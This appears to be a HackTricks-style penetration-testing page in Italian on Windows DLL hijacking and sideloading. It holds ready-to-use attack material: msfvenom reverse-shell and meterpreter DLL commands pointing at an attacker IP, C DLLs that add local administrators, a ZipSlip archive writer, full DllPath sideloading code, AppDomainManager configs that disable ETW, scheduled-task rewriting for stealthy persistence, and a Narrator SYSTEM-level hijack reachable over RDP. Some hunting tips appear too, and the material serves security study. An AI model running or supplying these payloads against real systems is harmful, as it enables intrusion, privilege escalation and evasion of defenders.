# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking coinvolge la manipolazione di un'applicazione fidata per fargli caricare una DLL malevola. Questo termine comprende varie tattiche come **DLL Spoofing, Injection, and Side-Loading**. Viene utilizzato principalmente per code execution, per ottenere persistence e, meno comunemente, per privilege escalation. Nonostante qui l'attenzione sia sull'escalation, il metodo di hijacking rimane coerente tra gli obiettivi.

### Common Techniques

Diversi metodi vengono usati per DLL hijacking, ciascuno con efficacia diversa a seconda della strategia di caricamento delle DLL dell'applicazione:

1. **DLL Replacement**: sostituire una DLL legittima con una malevola, eventualmente usando DLL Proxying per preservare la funzionalità della DLL originale.
2. **DLL Search Order Hijacking**: posizionare la DLL malevola in un percorso di ricerca prima di quella legittima, sfruttando il pattern di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: creare una DLL malevola da far caricare all'applicazione, facendole credere che sia una DLL richiesta ma inesistente.
4. **DLL Redirection**: modificare parametri di ricerca come `%PATH%` o file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione verso la DLL malevola.
5. **WinSxS DLL Replacement**: sostituire la DLL legittima con una controparte malevola nella directory WinSxS, un metodo spesso associato a DLL side-loading.
6. **Relative Path DLL Hijacking**: posizionare la DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, simile alle tecniche di Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Il classico DLL sideloading non è l'unico modo per far caricare codice dell'attaccante a un processo fidato **.NET Framework**. Se l'eseguibile target è un'applicazione **managed**, il CLR consulta anche un **application configuration file** con il nome dell'eseguibile (per esempio `Setup.exe.config`). Quel file può definire un **AppDomainManager** personalizzato. Se il config punta a un assembly controllato dall'attaccante posizionato accanto all'EXE, il CLR lo carica **prima del normale code path dell'applicazione** e lo esegue all'interno del processo fidato.

Secondo lo schema di configurazione di Microsoft .NET Framework, sia `<appDomainManagerAssembly>` sia `<appDomainManagerType>` devono essere presenti perché venga usato il manager personalizzato.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Manager minimale:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Note pratiche:
- Questa è **tradecraft specifica per .NET Framework**. Dipende dal parsing della configurazione CLR, non dall'ordine di ricerca delle DLL di Win32.
- L'host deve davvero essere un **managed EXE**. Triage rapido: `sigcheck -m target.exe`, `corflags target.exe`, oppure controlla l'**CLR Runtime Header** nei metadati PE.
- Il nome del file di configurazione deve corrispondere esattamente al nome dell'eseguibile (`<binary>.config`) e di solito si trova **accanto all'EXE**.
- È utile con **signed Microsoft/vendor binaries** perché l'EXE trusted rimane intatto mentre la malicious managed assembly viene eseguita in-process.
- Se hai già una directory di installazione/update scrivibile, AppDomainManager hijacking può essere usato come **first stage**, seguito da classic DLL sideloading o reflective loading per gli stadi successivi.

### Hijacking di un task schedulato esistente per rilanciare la sideload chain

Per la persistence, non limitarti a cercare **la creazione di un nuovo task**. Alcuni intrusion sets aspettano che un installer legittimo crei un **normal updater task** e poi **riscrivono l'azione del task** in modo che il nome, l'autore e il trigger esistenti restino familiari ai defender.

Workflow riutilizzabile:
1. Installa/esegui il software legittimo e identifica il task che crea normalmente.
2. Esporta il XML del task e annota i valori attuali di `<Exec><Command>` / `<Arguments>`.
3. Sostituisci solo l'azione in modo che il task avvii il tuo **trusted host EXE** da una directory di staging scrivibile dall'utente, che poi fa side-load o AppDomain-load del payload reale.
4. Registra di nuovo lo stesso nome del task invece di creare un nuovo ovvio persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Perché è più stealth:
- Il nome del task può comunque sembrare legittimo (per esempio un vendor updater).
- Il **Task Scheduler service** lo avvia, quindi la validazione di parent/ancestor spesso vede la catena di scheduling attesa invece di `explorer.exe`.
- I team DFIR che cercano solo **nuovi task names** possono perdere un task la cui registrazione esisteva già ma la cui action ora punta a `%LOCALAPPDATA%`, `%APPDATA%` o a un altro path controllato dall’attaccante.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Confronta i metadati XML di `C:\Windows\System32\Tasks\*` e `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` con una baseline.
- Genera alert quando un **vendor-looking updater task** esegue da **user-writable directories** o avvia una .NET EXE con un file `*.config` collocato nella stessa directory.

> [!TIP]
> Per una chain passo-passo che combina HTML staging, configurazioni AES-CTR e implant .NET sopra DLL sideloading, rivedi il workflow qui sotto.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Il modo più comune per trovare Dlls mancanti in un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) da sysinternals, **impostando** i **seguenti 2 filtri**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

e mostrando solo la **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Se stai cercando **missing dlls in generale** lascia il processo in esecuzione per alcuni **secondi**.\
Se stai cercando una **missing dll dentro un eseguibile specifico** dovresti impostare **un altro filtro tipo "Process Name" "contains" `<exec name>`, eseguirlo e fermare la cattura degli eventi**.

## Exploiting Missing Dlls

Per ottenere privilege escalation, la migliore possibilità che abbiamo è poter **scrivere una dll che un processo privilegiato proverà a caricare** in qualche **posto in cui verrà cercata**. Quindi, potremo **scrivere** una dll in una **cartella** in cui la **dll viene cercata prima** della cartella in cui si trova la **dll originale** (caso strano), oppure potremo **scrivere in una cartella in cui la dll verrà cercata** e la **dll originale** non esiste in nessuna cartella.

### Dll Search Order

**Nella** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare come vengono caricate le Dll in modo specifico.**

Le **Windows applications** cercano le DLL seguendo un insieme di **pre-defined search paths**, rispettando una sequenza precisa. Il problema del DLL hijacking nasce quando una DLL malevola viene posizionata strategicamente in una di queste directory, assicurando che venga caricata prima della DLL autentica. Una soluzione per prevenirlo è fare in modo che l'applicazione usi absolute paths quando fa riferimento alle DLL di cui ha bisogno.

Puoi vedere sotto la **DLL search order on 32-bit** systems:

1. La directory da cui l'applicazione è stata caricata.
2. La system directory. Usa la funzione [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) per ottenere il path di questa directory.(_C:\Windows\System32_)
3. La 16-bit system directory. Non esiste una funzione che ottenga il path di questa directory, ma viene cercata. (_C:\Windows\System_)
4. La Windows directory. Usa la funzione [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) per ottenere il path di questa directory.
1. (_C:\Windows_)
5. La directory corrente.
6. Le directory elencate nella variabile di ambiente PATH. Nota che questo non include il per-application path specificato dalla chiave di registro **App Paths**. La chiave **App Paths** non viene usata quando si calcola il DLL search path.

Questo è l'ordine di ricerca **default** con **SafeDllSearchMode** abilitato. Quando è disabilitato la directory corrente sale al secondo posto. Per disabilitare questa funzionalità, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo a 0 (di default è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH** la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, nota che **una dll potrebbe essere caricata indicando il path assoluto invece del solo nome**. In quel caso quella dll verrà **cercata solo in quel path** (se la dll ha dipendenze, saranno cercate come se fossero state appena caricate per nome).

Ci sono altri modi per alterare l'ordine di ricerca, ma non li spiegherò qui.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Usa i filtri di **ProcMon** (`Process Name` = target EXE, `Path` termina con `.dll`, `Result` = `NAME NOT FOUND`) per raccogliere i nomi delle DLL che il processo cerca ma non trova.
2. Se il binary gira su una **schedule/service**, lasciare una DLL con uno di quei nomi nella **application directory** (entry #1 dell'ordine di ricerca) farà sì che venga caricata alla successiva esecuzione. In un caso di scanner .NET il processo cercava `hostfxr.dll` in `C:\samples\app\` prima di caricare la copia reale da `C:\Program Files\dotnet\fxr\...`.
3. Crea una payload DLL (per esempio reverse shell) con qualsiasi export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Se il tuo primitive è una **ZipSlip-style arbitrary write**, costruisci uno ZIP la cui entry esca dalla extraction dir così che la DLL finisca nella cartella dell'app:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Consegna l'archive alla watched inbox/share; quando la scheduled task riavvia il process carica la malicious DLL ed esegue il tuo code come service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Un modo avanzato per influenzare in modo deterministico il DLL search path di un process appena creato è impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS quando si crea il process con le native APIs di ntdll. Fornendo qui una directory controllata dall'attacker, un target process che risolve una imported DLL per nome (senza absolute path e senza usare i safe loading flags) può essere forzato a caricare una malicious DLL da quella directory.

Key idea
- Build the process parameters con RtlCreateProcessParametersEx e fornisci un DllPath custom che punti alla tua cartella controllata (ad esempio la directory dove vive il tuo dropper/unpacker).
- Crea il process con RtlCreateUserProcess. Quando il target binary risolve una DLL per nome, il loader consulterà questo DllPath fornito durante la resolution, consentendo un sideloading affidabile anche quando la malicious DLL non è nella stessa directory dell'EXE target.

Notes/limitations
- Questo influenza il child process che viene creato; è diverso da SetDllDirectory, che influenza solo il current process.
- Il target deve importare o usare LoadLibrary per una DLL per nome (senza absolute path e senza usare LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e hardcoded absolute paths non possono essere hijacked. Forwarded exports e SxS possono cambiare la precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Esempio di utilizzo operativo
- Posiziona una xmllite.dll malevola (che esporti le funzioni richieste o faccia proxy verso quella reale) nella tua directory DllPath.
- Avvia un binary firmato noto per cercare xmllite.dll per nome usando la tecnica sopra. Il loader risolve l'import tramite il DllPath fornito e sideloads la tua DLL.

Questa tecnica è stata osservata in-the-wild per guidare catene di sideloading multi-stage: un launcher iniziale rilascia una DLL helper, che poi avvia un binary Microsoft-signed, hijackable con un DllPath personalizzato per forzare il caricamento della DLL dell'attaccante da una directory di staging.


### .NET AppDomainManager hijacking via `.exe.config`

Per target **.NET Framework**, il sideloading può essere fatto **prima di `Main()`** senza patching della memoria abusando del file adiacente **`.exe.config`** dell'applicazione. Invece di fare affidamento solo sull'ordine di ricerca delle DLL Win32, l'attaccante posiziona un legittimo .NET EXE accanto a un config malevolo e a una o più assembly controllate dall'attaccante.

Come funziona la chain:
1. L'host EXE si avvia e il **CLR legge `<exe>.config`**.
2. Il config imposta **`<appDomainManagerAssembly>`** e **`<appDomainManagerType>`** in modo che il runtime istanzi un `AppDomainManager` controllato dall'attaccante.
3. Il manager malevolo ottiene l'esecuzione **pre-`Main()`** all'interno del processo host fidato.
4. Lo stesso config può forzare il CLR a risolvere prima le assembly locali (per esempio `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) e può indebolire la validazione/telemetria del runtime senza inline patching.

Pattern in stile campaign (il nesting esatto può variare in base alla direttiva / versione CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Perché è utile:
- **`<probing privatePath="."/>`** mantiene la risoluzione degli assembly nella directory dell’applicazione, trasformando la cartella in una superficie di sideloading prevedibile.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** spostano l’esecuzione nel codice dell’attaccante durante l’inizializzazione del CLR, prima che parta la logica legittima dell’app.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** può permettere a un’app full-trust di caricare assembly non firmati o manomessi senza un fallimento della validazione strong-name.
- **`<publisherPolicy apply="no"/>`** evita i redirect della publisher-policy verso assembly più recenti.
- **`<requiredRuntime ... safemode="true"/>`** rende la selezione del runtime più deterministica.
- **`<etwEnable enabled="false"/>`** è particolarmente interessante perché il **CLR disabilita la propria visibilità ETW** dalla configurazione invece di far patchare all’implant `EtwEventWrite` in memoria.

Pattern operativo visto in campagne recenti:
- La fase 1 deposita `setup.exe`, `setup.exe.config` e assembly locali.
- La fase 2 li copia in una cartella **AppData update** credibile, rinomina l’host in qualcosa come `update.exe` e lo rilancia tramite un **scheduled task**.
- La fase 3 verifica il contesto di esecuzione (per esempio il parent atteso `svchost.exe` da Task Scheduler) prima di caricare il DLL/export finale del RAT.

Idee di hunting:
- **.NET executables** firmati o comunque legittimi che eseguono con sospetti file **`.config`** adiacenti in percorsi scrivibili dall’utente.
- File `.config` che contengono **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** o **`etwEnable enabled="false"`**.
- Scheduled task che rilanciano binary di update rinominati da **`%LOCALAPPDATA%`** o da directory specifiche dell’app come `\bin\update\`.
- Catene parent/child in cui un scheduled task avvia un trusted host .NET che carica immediatamente assembly non del vendor dalla propria directory.

#### Eccezioni sull’ordine di ricerca delle DLL dai documenti Windows

Alcune eccezioni allo standard ordine di ricerca delle DLL sono indicate nella documentazione Windows:

- Quando viene incontrata una **DLL che condivide il nome con una già caricata in memoria**, il sistema bypassa la ricerca usuale. Invece, esegue un controllo per redirection e manifest prima di usare la DLL già in memoria. **In questo scenario, il sistema non esegue una ricerca della DLL**.
- Nei casi in cui la DLL venga riconosciuta come una **known DLL** per la versione corrente di Windows, il sistema utilizzerà la sua versione della known DLL, insieme a tutte le sue DLL dipendenti, **saltando il processo di ricerca**. La chiave di registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene l’elenco di queste known DLL.
- Se una **DLL ha dipendenze**, la ricerca di queste DLL dipendenti viene eseguita come se fossero indicate solo tramite i loro **nomi di modulo**, indipendentemente dal fatto che la DLL iniziale sia stata identificata tramite un full path.

### Escalating Privileges

**Requirements**:

- Identificare un processo che opera o opererà con **privilegi diversi** (horizontal o lateral movement), che sia **privo di una DLL**.
- Assicurarsi che sia disponibile l’**accesso in scrittura** a qualsiasi **directory** in cui la **DLL** verrà **cercata**. Questa posizione può essere la directory dell’eseguibile o una directory all’interno del system path.

Sì, i requisiti sono complicati da trovare perché **di default è piuttosto strano trovare un eseguibile privilegiato senza una dll** ed è anche **più strano avere permessi di scrittura su una cartella del system path** (di default non puoi). Però, in ambienti misconfigurati questo è possibile.\
Nel caso tu sia fortunato e ti ritrovi a soddisfare i requisiti, puoi controllare il progetto [UACME](https://github.com/hfiref0x/UACME). Anche se **l’obiettivo principale del progetto è bypass UAC**, lì potresti trovare un **PoC** di un Dll hijaking per la versione di Windows che puoi usare (probabilmente cambiando solo il path della cartella in cui hai i permessi di scrittura).

Nota che puoi **verificare i tuoi permessi in una cartella** facendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **controlla i permessi di tutte le cartelle dentro PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche controllare gli import di un eseguibile e gli export di una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abuse Dll Hijacking per escalare privilegi** con permessi di scrittura in una cartella **System Path** consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)controllerà se hai permessi di scrittura su qualsiasi cartella all'interno del system PATH.\
Altri strumenti automatici interessanti per scoprire questa vulnerabilità sono le funzioni di **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Example

Nel caso in cui trovi uno scenario sfruttabile, una delle cose più importanti per riuscire a sfruttarlo sarebbe **creare una dll che esporti almeno tutte le funzioni che l'executable importerà da essa**. In ogni caso, nota che Dll Hijacking è utile per [escalare da un livello Medium Integrity a High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da[ **High Integrity a SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare una dll valida** in questo studio sul dll hijacking focalizzato sul dll hijacking per execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **next sectio**n puoi trovare alcuni **basic dll codes** che potrebbero essere utili come **templates** o per creare una **dll con funzioni non richieste esportate**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

In pratica una **Dll proxy** è una Dll capace di **execute your malicious code when loaded** ma anche di **expose** e **work** come **exected** tramite il **relay di tutte le chiamate alla libreria reale**.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un executable e selezionare la library** che vuoi proxify e **generate a proxified dll** oppure **indicare la Dll** e **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crea un user (x86 non ho visto una versione x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Tuo

Nota che in diversi casi il Dll che compili deve **esportare diverse funzioni** che verranno caricate dal processo vittima; se queste funzioni non esistono, il **binary non sarà in grado di caricarle** e l’**exploit fallirà**.

<details>
<summary>Template C DLL (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Esempio di DLL C++ con creazione utente</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativo con thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Caso di studio: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe continua a verificare all’avvio una DLL di localizzazione prevedibile, specifica per lingua, che può essere hijacked per eseguire codice arbitrario e ottenere persistence.

Fatti chiave
- Percorso di verifica (build correnti): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Percorso legacy (build precedenti): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se esiste una DLL scrivibile e controllata dall’attaccante nel percorso OneCore, viene caricata e viene eseguito `DllMain(DLL_PROCESS_ATTACH)`. Non sono richieste export.

Discovery con Procmon
- Filter: `Process Name is Narrator.exe` e `Operation is Load Image` or `CreateFile`.
- Avvia Narrator e osserva il tentativo di caricamento del percorso sopra.  
 
Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Un hijack ingenuo farà parlare/evidenziare la UI. Per restare silenziosi, all’attach enumera i thread di Narrator, apri il thread principale (`OpenThread(THREAD_SUSPEND_RESUME)`) e sospendilo con `SuspendThread`; continua nel tuo thread. Vedi il PoC per il codice completo.

Trigger e persistenza tramite configurazione Accessibility
- Contesto utente (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con quanto sopra, avviando Narrator viene caricato il DLL piazzato. Sulla secure desktop (schermata di logon), premi CTRL+WIN+ENTER per avviare Narrator; il tuo DLL viene eseguito come SYSTEM sulla secure desktop.

Esecuzione SYSTEM attivata via RDP (lateral movement)
- Consenti il classico security layer di RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Connettiti in RDP all'host, alla schermata di logon premi CTRL+WIN+ENTER per avviare Narrator; il tuo DLL viene eseguito come SYSTEM sulla secure desktop.
- L’esecuzione si interrompe quando la sessione RDP si chiude—inject/migrate rapidamente.

Bring Your Own Accessibility (BYOA)
- Puoi clonare una voce del registry di un Accessibility Tool (AT) integrato (ad es. CursorIndicator), modificarla per puntare a un binario/DLL arbitrario, importarla e poi impostare `configuration` con il nome di quell’AT. Questo fa da proxy a esecuzione arbitraria nel framework Accessibility.

Note
- Scrivere in `%windir%\System32` e modificare i valori HKLM richiede privilegi admin.
- Tutta la logica del payload può stare in `DLL_PROCESS_ATTACH`; non servono export.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Come utente standard, drop `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendi che il scheduled task venga eseguito alle 9:30 AM nel contesto dell'utente corrente.
3. Se un amministratore è logged in quando il task viene eseguito, la DLL malevola viene eseguita nella sessione dell'amministratore con medium integrity.
4. Catena standard di tecniche UAC bypass per elevare da medium integrity a privilegi SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Gli threat actors spesso combinano MSI-based droppers con DLL side-loading per eseguire payload sotto un processo trusted e signed.

Panoramica della chain
- L'utente scarica l'MSI. Una CustomAction viene eseguita silenziosamente durante l'installazione GUI (ad es. LaunchApplication o un'azione VBScript), ricostruendo lo stage successivo da risorse embedded.
- Il dropper scrive una EXE legittima e signed e una DLL malevola nella stessa directory (coppia di esempio: wsc_proxy.exe signed da Avast + wsc.dll controllata dall'attaccante).
- Quando la EXE signed viene avviata, l'ordine di ricerca delle DLL di Windows carica prima wsc.dll dalla working directory, eseguendo il codice dell'attaccante sotto un parent signed (ATT&CK T1574.001).

Analisi MSI (cosa cercare)
- Tabella CustomAction:
- Cerca entry che eseguono executable o VBScript. Esempio di pattern sospetto: LaunchApplication che esegue un file embedded in background.
